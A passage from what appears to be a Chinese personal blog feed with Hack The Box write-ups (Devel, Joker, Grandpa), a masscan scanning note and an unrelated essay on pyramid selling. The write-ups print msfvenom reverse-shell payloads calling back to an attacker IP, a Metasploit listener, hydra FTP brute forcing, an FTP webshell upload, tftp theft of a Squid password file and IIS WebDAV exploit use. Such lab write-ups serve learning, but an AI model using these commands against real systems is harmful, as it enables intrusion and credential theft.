    <content type="html"><![CDATA[<p>10.10.10.5</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">21</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span>     Microsoft ftpd<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Microsoft IIS httpd <span class="hljs-number">7.5</span><br><br></code></pre></div></td></tr></table></figure><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">ftp 10.10.10.5<br>anonymous<br>03<span class="hljs-string">-18</span><span class="hljs-string">-17</span>  01:06AM       &lt;DIR&gt;          aspnet_client<br>03<span class="hljs-string">-17</span><span class="hljs-string">-17</span>  04:37PM                  689 iisstart.htm<br>01<span class="hljs-string">-11</span><span class="hljs-string">-19</span>  01:21AM                 2826 shell.aspx<br>01<span class="hljs-string">-11</span><span class="hljs-string">-19</span>  01:24AM                 2824 shell1.aspx<br>01<span class="hljs-string">-11</span><span class="hljs-string">-19</span>  01:30AM                 2863 shell2.aspx<br>03<span class="hljs-string">-17</span><span class="hljs-string">-17</span>  04:37PM               184946 welcome.png<br><br>get iisstart.htm<br>get shell.aspx<br>get shell1.aspx<br>get shell2.aspx<br>get welcome.png<br>cd aspnet_client<br>cd system_web<br>cd 2_0_50727<br>pwd<br>/aspnet_client/system_web/2_0_50727<br></code></pre></div></td></tr></table></figure><p>下载并查看后，推测aspx脚本是服务器上要用的脚本，但看不出具体用途</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><a href="http://10.10.10.5/aspnet_client/system_web/">http://10.10.10.5/aspnet_client/system_web/</a> 403 forbidden<br>You do not have permission to view this directory or page using the credentials that you supplied.</p><p><a href="http://10.10.10.5/shell.aspx">http://10.10.10.5/shell.aspx</a></p><h4 id="trying1"><a href="#trying1" class="headerlink" title="trying1"></a>trying1</h4><p>当进行信息搜集了以后，发现ftp共享的目录就是web目录。</p><p>如果可以上传一个aspx类型的shell，通过web就可以获取webshell。</p><p><code>hydra -l server -P /usr/share/wordlists/rockyou.txt -I 10.10.10.5 ftp</code><br><code>hydra -l ftp -P /usr/share/wordlists/rockyou.txt -I 10.10.10.5 ftp</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-10/11.PNG" alt="11"></p><h4 id="trying2-生成一个aspx类型的shell。"><a href="#trying2-生成一个aspx类型的shell。" class="headerlink" title="trying2: 生成一个aspx类型的shell。"></a>trying2: 生成一个aspx类型的shell。</h4><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">msfvenom -l formats | <span class="hljs-keyword">grep</span> asp<br>msfvenom -l payload | <span class="hljs-keyword">grep</span> windows | <span class="hljs-keyword">grep</span> meterpreter<br>msfvenom -p windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_http LHOST=<span class="hljs-string">&quot;10.10.14.13&quot;</span> LPORT=<span class="hljs-number">7766</span> -o <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/5/g</span>lory.aspx<br><br>ftp put上传<br></code></pre></div></td></tr></table></figure><h4 id="trying3-msf"><a href="#trying3-msf" class="headerlink" title="trying3: msf"></a>trying3: msf</h4><p>设置监听</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST tun0</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 7766</span><br>run<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-10/1.PNG" alt="1"></p><p>失败</p><h2 id="获取一个webshell"><a href="#获取一个webshell" class="headerlink" title="获取一个webshell"></a>获取一个webshell</h2><p>重新上传asp类型的一句话，然后菜刀连接。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-10/2.PNG" alt="2"></p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">whoami<br><span class="hljs-keyword">iis</span> apppool\web<br><br><span class="hljs-keyword">net</span> user<br>Administrator            babis                    Guest                    <br>The command completed with <span class="hljs-keyword">one</span> or <span class="hljs-keyword">more</span> errors.<br></code></pre></div></td></tr></table></figure><p>权限不够，很多东西都看不了</p><h2 id="错误的总结"><a href="#错误的总结" class="headerlink" title="错误的总结"></a>错误的总结</h2><p>以下的命令生成的payload不能成功执行。注意x64，是64位的windows，血泪的教训，会报一个错。<br><code>msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&quot;10.10.14.13&quot; LPORT=7766 -o /root/Desktop/5/glory.aspx</code></p><p>正确的方式：<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;10.10.14.13&quot; LPORT=7765 -f aspx  &gt; /root/Desktop/5/4.aspx</code></p><p>一开始在生成格式中纠结，是生成asp类型，还是apsx类型？<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-10/3.PNG" alt="3"></p><h4 id="asp和aspx的区别"><a href="#asp和aspx的区别" class="headerlink" title="asp和aspx的区别"></a>asp和aspx的区别</h4><p>asp是十几年前的产品。</p><p>aspx是asp的升级版，aspx整合了.net框架,不仅仅能做网页</p><h4 id="关于set-ExitOnSession-false"><a href="#关于set-ExitOnSession-false" class="headerlink" title="关于set ExitOnSession false"></a>关于<code>set ExitOnSession false</code></h4><p>因为handler application可以继续作为作业（job）运行，即使在关闭或失败的meterpreter会话的情况下也是如此。它仅适用于作业（-j），因为这些是在后台运行的唯一作业。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-10/4.PNG" alt="4"></p><p>windows提权，使用的方法，<a href="https://whale3070.github.io/training/2019/01/06/x/">search suggester</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-10/5.png" alt="5"></p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">shell</span><br><span class="hljs-keyword">cd</span> c:\Users\Administrator\Desktop<br><span class="hljs-keyword">type</span> root.txt.txt<br></code></pre></div></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一次渗透还挺顺利的，因为用到的都是以前就学过的知识。</p><p>几乎立即就认识到了攻击路径。</p><p>还行吧，继续加油。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>windows</tag>
      
      <tag>port 21</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>masscan结合python快速枚举批量主机端口</title>
    <link href="/2019/01/09/x/"/>
    <url>/2019/01/09/x/</url>
    
    <content type="html"><![CDATA[<p>还记得当时360电话面试的时候，问我互联网上最快的扫描器是什么，我回答的zenmap？</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-09/90.PNG" alt="90"></p><p>最近渗透测试的实习，给了很多主机，记录一下。</p><h2 id="python去重"><a href="#python去重" class="headerlink" title="python去重"></a>python去重</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-09/1.PNG" alt="1"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">ips = []<br>write_ips = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ips.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> f:<br>ips.append(<span class="hljs-built_in">line</span>)<br><span class="hljs-built_in">clear</span> = list(<span class="hljs-built_in">set</span>(ips))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">clear</span>:<br>write_ips.<span class="hljs-built_in">write</span>(i)<br>print <span class="hljs-built_in">len</span>(<span class="hljs-built_in">clear</span>)<br></code></pre></div></td></tr></table></figure><p>获得了一百多个的主机列表ips.txt。</p><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a><a href="http://www.4hou.com/tools/8251.html">masscan</a></h2><p>扫描某台主机的tcp和udp的所有端口</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-attribute">read</span> -p <span class="hljs-string">&quot;which ip? &quot;</span> ip<br><span class="hljs-attribute">masscan</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-variable">$&#123;ip&#125;</span> --rate=<span class="hljs-number">1000</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -e tun<span class="hljs-number">0</span> &gt; ports<br></code></pre></div></td></tr></table></figure><p>masscan选项和nmap类似，用-iL ips.txt，可以批量进行扫描</p><h2 id="脚本批量扫描htb主机"><a href="#脚本批量扫描htb主机" class="headerlink" title="脚本批量扫描htb主机"></a>脚本批量扫描htb主机</h2><ol><li><p>登陆htb，右键查看源代码，复制该页面源码，另存为ip-raw.txt</p></li><li><p>用脚本提取ip到htb_ip.txt。</p></li></ol><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">import requests<br><br>import re<br><br>myre = <span class="hljs-string">&quot;10.10.10.\d+&quot;</span><br><br>write_ip = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;htb_ip.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip-raw.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> f:<br><br>find_ip = re.findall(myre,<span class="hljs-built_in">line</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> find_ip:<br><br>write_ip.<span class="hljs-built_in">write</span>(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>write_ip.<span class="hljs-built_in">close</span>()<br></code></pre></div></td></tr></table></figure><p>3.用nmap在vps上扫描。这样可以节省自己的时间。等有空的时候，查看扫描结果。</p><p><code>masscan -p1-65535,U:1-65535 -iL htb_ip.txt --rate=1000 -p1-65535,U:1-65535 -e tun0 &gt; htb-all-scan.txt</code></p>]]></content>
    
    
    <categories>
      
      <category>scan</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>论传销</title>
    <link href="/2019/01/08/x/"/>
    <url>/2019/01/08/x/</url>
    
    <content type="html"><![CDATA[<h1 id="论传销"><a href="#论传销" class="headerlink" title="论传销"></a>论传销</h1><p>写这篇文章的起因。</p><p>最近苹果手机电池不行了，一到百分之30就噌噌噌往下掉。于是我上班的间歇，就找了个手机维修店。店主把我的手机拆开，然后让我等十多分钟，还拿着吹风机吹。然后就出门了，让我等一会儿。</p><p>我百无聊赖的也不知道干什么，盯了一会儿拆下来的电池。电池居然是软的，被掰弯了==</p><p>期间，有一个搞推销的青年走了进来。一开始给店员推销，店员拼命拒绝。他的脖子上很明显的钴蓝色带子，挂着的应该是证件，加上他尴尬推销的话术，让我对他产生了观察的兴趣。</p><p>因为无聊，我盯着他们看，推销青年就走了过来，问我听没听过xxx。</p><p>？？一问三不知的我</p><p>听了一会儿，我调戏小哥“传销是犯法的你知道吗？”</p><p>然后他说和百度合作，企业成立7年，还说什么打压京东淘宝。还说这个平台上什么都有。</p><p>他说的话槽点太多，不知道从那吐槽起。百度?？莆田系医院知道么？竞价排名知道吗？央视打过广告的e租宝知道么？</p><p>我，“….” （反正修手机，等着也是等着，调戏他打发一下时间）心里一直在吐槽，什么破平台，听都没听过，打压京东淘宝这种话都说得出来，呵呵。</p><p>一开始，他说平台上什么都有，我没往那方面想。一翻app，发现一个问题，基本卖的是母婴产品。</p><p>“既然蜜芽是母婴产品，不要在手机店推销”。目标群体都选择错误了，我建议他。</p><hr><p>他尝试获取我的信任，利用百度等具有知名度的企业名声。</p><p>然后给我看了一些照片视频，说明蜜芽是个成功的平台。最后塞给了我一张艳红色的充满廉价感的广告纸，羞涩地指了指上面他的微信号。</p><p>我无语地盯着上面的“xxx月入上万”</p><hr><p>传销就是骗子忽悠傻子。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-08/%E6%8D%95%E8%8E%B7.PNG" alt="捕获"></p><p>不管它是不是传销，还是什么分享经济。淘宝京东等大平台具有垄断性质，现在仿照这种模式抢占市场就是死路一条。</p><p>网上搜索一下，没有任何消息，太正常了。e租宝跑路之前，也不是相安无事吗。</p><hr><p>猜测他们应该是组织化的，看这个男人的言辞，不像是有能力独立运作这些的人。</p><p>传单、产品、脖子上挂的证件，被别人拒绝后依然软磨硬泡了几十分钟。</p><p>都让我猜测，他回去以后，别人给他定了多少“销售目标”。</p><hr><p>我想起了以前看的《中国少了一味药》，作者潜入传销集团，探究是什么让传销屡禁不止。</p><p>多的不想再说了。只是觉得今天遇到的这个男人很可怜，怀着发财梦穿梭在大街小巷。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Joker（http-proxy）</title>
    <link href="/2019/01/07/x/"/>
    <url>/2019/01/07/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.21  </p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">22</span>/tcp   open  ssh        OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">3</span>p<span class="hljs-number">1</span> Ubuntu <span class="hljs-number">1</span>ubuntu<span class="hljs-number">0</span>.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">3128</span>/tcp open  http-proxy Squid http proxy <span class="hljs-number">3</span>.<span class="hljs-number">5</span>.<span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>目录扫描，连接时间异常，没有找到任何页面<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/3.PNG" alt="3"></p><h4 id="trying1-缓冲区溢出"><a href="#trying1-缓冲区溢出" class="headerlink" title="trying1:缓冲区溢出"></a>trying1:缓冲区溢出</h4><p>searchsploit squid 3<br>Squid 2.5.x/3.x - NTLM Buffer Overflow (Metasploit)  2004-06-08 </p><p>msf模块尝试过后，失败。一看时间2004年，太早了，应该是2016年那个缓冲区溢出的漏洞。</p><h4 id="trying2-搜索squid-3-5-12"><a href="#trying2-搜索squid-3-5-12" class="headerlink" title="trying2:搜索squid 3.5.12"></a>trying2:搜索squid 3.5.12</h4><p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-9950/product_id-17766/version_id-192919/Squid-cache-Squid-3.5.12.html">该软件漏洞的详细信息</a></p><p><a href="https://www.cvedetails.com/cve/CVE-2016-4054/">https://www.cvedetails.com/cve/CVE-2016-4054/</a></p><p>Buffer overflow in Squid 3.x before 3.5.17 and 4.x before 4.0.9 allows remote attackers to execute arbitrary code via crafted Edge Side Includes (ESI) responses.<br>找到一个，缓冲区溢出允许远程代码执行。</p><p>漏洞编号为CVE-2016-4054。</p><p>但是漏洞数据库都只是指出了有这个漏洞，没有给任何poc、exp，自己写？？</p><h2 id="根据wp进行学习"><a href="#根据wp进行学习" class="headerlink" title="根据wp进行学习"></a>根据wp进行学习</h2><p>根据proxy，于是添加一个10.10.10.21，端口为3128的代理。</p><p>这就触及到了我的知识盲区。代理还能这么玩儿？？</p><p>但仔细一想，例如我的vps代理，添加ip、端口、用户名、密码等信息，不就可以转发数据包了吗。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/4.PNG" alt="4"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/5.PNG" alt="5"></p><h2 id="获取proxy口令"><a href="#获取proxy口令" class="headerlink" title="获取proxy口令"></a>获取proxy口令</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/6.PNG" alt="6"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> squid.conf | grep -v ^\#| grep .<br><span class="hljs-attribute">tftp</span> <span class="hljs-number">10.10.10.21</span><br><span class="hljs-attribute">get</span> /etc/squid/passwords<br><br><span class="hljs-attribute">kalamari</span>:$apr<span class="hljs-number">1</span>$zyzBxQYW$pL<span class="hljs-number">360</span>IoLQ<span class="hljs-number">5</span>Yum<span class="hljs-number">5</span>SLTph.l<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h2 id="破解密文"><a href="#破解密文" class="headerlink" title="破解密文"></a>破解密文</h2><p>偷懒起见，先在线网站搜索一下。看来支持的加密方式很少啊，md5加密sha1什么的比较常见。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/7.PNG" alt="7"></p><p>再试一下本地密码破解工具john the ripper，但不是很管用啊。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/8.PNG" alt="8"></p><p>据说<a href="https://hashcat.net/wiki/">hashcat</a>是世界上最快，最先进的密码恢复工具。</p><p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example_hashes</a><br>在表中检查到Hash-Mode，1600。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/9.PNG" alt="9"><br>报了一个错，搜索一下No devices found/left.</p><p>因为虚拟机无法访问显卡，，看我贫穷的眼神。</p><p>要么1.  在主机设备上使用Hashcat破解，或<br>2.  在主硬盘上安装Kali</p><p>windows + kali虚拟机的我，表示臣妾做不到。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/timg.png" alt="timg"></p><h2 id="ssrf准备提权"><a href="#ssrf准备提权" class="headerlink" title="ssrf准备提权"></a>ssrf准备提权</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/11.PNG" alt="11"><br>要想测试挂代理才能访问的http，必须在burp里添加代理。。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-07/10.PNG" alt="10"></p><p><a href="https://whale3070.github.io/training/2018/06/02/x/">ssrf</a><br>之前也遇到过，可以获取服务端隐秘信息。。</p><p>不早了，睡觉==</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知识限制了我的想象力（==）<br>好多东西第一次见哈哈</p><p>关于扫描：在做单独主机的渗透测试时，必须检查udp和tcp的65535个端口，而不是tcp的常见1000端口。</p><p>关于信息搜集：grep -v xx不能用单引号+关键字</p><p>关于密码学破解方式：hashcat的密码破解方式有很多，需要后续自行学习。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
      <tag>port unusual</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Grandpa（msf栈溢出）</title>
    <link href="/2019/01/06/x/"/>
    <url>/2019/01/06/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.14</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><p><code>80/tcp open  http    Microsoft IIS httpd 6.0</code></p><p>只开了一个80端口，iis 6.0让我想到了文件解析漏洞</p><p>os scan:Running (JUST GUESSING): Microsoft Windows 2003|2008|2000|XP (91%)</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>anyway，先扫一下web目录吧~~<br>只有一个img目录，403</p><p>信息很少啊，估计是中间件漏洞，于是搜一下IIS 6.0 exploit，以及“microsoftofficewebserver header: 5.0_Pub”</p><p>nikto scan result:</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">+ Retrieved dasl <span class="hljs-keyword">header</span>: &lt;DAV:<span class="hljs-keyword">sql</span>&gt;<br>+ Retrieved dav <span class="hljs-keyword">header</span>: <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>+ Retrieved ms-author-via <span class="hljs-keyword">header</span>: MS-FP/<span class="hljs-number">4.0</span>,DAV<br>+ Uncommon <span class="hljs-keyword">header</span> <span class="hljs-string">&#x27;ms-author-via&#x27;</span> <span class="hljs-built_in">found</span>, <span class="hljs-keyword">with</span> contents: MS-FP/<span class="hljs-number">4.0</span>,DAV<br><br></code></pre></div></td></tr></table></figure><p>注意dav</p><h4 id="trying1-远程栈溢出"><a href="#trying1-远程栈溢出" class="headerlink" title="trying1: 远程栈溢出"></a>trying1: 远程栈溢出</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">searchsploit iis <span class="hljs-number">6.0</span><br>searchsploit -m exploits<span class="hljs-regexp">/windows/</span>remote/<span class="hljs-number">41738</span>.py<br>Microsoft IIS <span class="hljs-number">6.0</span> - WebDAV <span class="hljs-string">&#x27;ScStoragePathFromUrl&#x27;</span> Remote Buffer Overflow  <br>利用失败<br></code></pre></div></td></tr></table></figure><h4 id="trying2-Microsoft-FrontPage匿名登陆"><a href="#trying2-Microsoft-FrontPage匿名登陆" class="headerlink" title="trying2: Microsoft FrontPage匿名登陆"></a>trying2: Microsoft FrontPage匿名登陆</h4><p><code>OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06/1.PNG" alt="1"><br>搜索一下Microsoft FrontPage </p><p>auxiliary/scanner/http/frontpage_login</p><p>结果</p><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span>:<span class="hljs-selector-tag">80</span>        <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.10.10.14/ may not support FrontPage Server Extensions</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Scanned</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">hosts</span> (<span class="hljs-number">100%</span> complete)<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Auxiliary</span> <span class="hljs-selector-tag">module</span> <span class="hljs-selector-tag">execution</span> <span class="hljs-selector-tag">completed</span><br></code></pre></div></td></tr></table></figure><h4 id="什么是WebDAV？"><a href="#什么是WebDAV？" class="headerlink" title="什么是WebDAV？"></a>什么是WebDAV？</h4><p>WebDAV 是 HTTP/1.1 协议的扩展，它允许客户机执行<strong>远程</strong> Web 内容制作操作。WebDAV 是对 HTTP/1.1 协议的扩展，添加了新的 HTTP 方法和标头，支持任意类型的 Web 制作，不仅支持 HTML 和 XML，还支持文本、图形、电子表格等格式。<br><a href="https://blog.csdn.net/u014270687/article/details/45798227">Webdav安全配置相关与漏洞利用</a></p><h4 id="trying3-webdav-put上传"><a href="#trying3-webdav-put上传" class="headerlink" title="trying3: webdav put上传"></a>trying3: webdav put上传</h4><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">exploit/windows/iis/iis_webdav_upload_asp<br><br><span class="hljs-selector-attr">[*]</span> Started reverse TCP handler on <span class="hljs-number">10.10</span>.<span class="hljs-number">14.13</span>:<span class="hljs-number">4444</span> <br><span class="hljs-selector-attr">[*]</span> Checking /metasploit250598085<span class="hljs-selector-class">.asp</span><br><span class="hljs-selector-attr">[*]</span> Uploading <span class="hljs-number">611136</span> bytes to /metasploit250598085<span class="hljs-selector-class">.txt</span>...<br><span class="hljs-selector-attr">[-]</span> Upload failed on /metasploit250598085<span class="hljs-selector-class">.txt</span> <span class="hljs-selector-attr">[500 Internal Server Error]</span><br><span class="hljs-selector-attr">[*]</span> Exploit completed, but no session was created.<br></code></pre></div></td></tr></table></figure><h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><p>远程栈溢出<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06/2.PNG" alt="2"><br>当时python的exp执行失败，就以为该漏洞不存在==</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">iis</span>/iis_webdav_scstoragepathfromurl<br><span class="hljs-keyword">set</span> RHOST 10.10.10.14<br><span class="hljs-keyword">run</span><br>getuid<br><span class="hljs-keyword">pwd</span><br>sysinfo<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06/3.PNG" alt="3"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 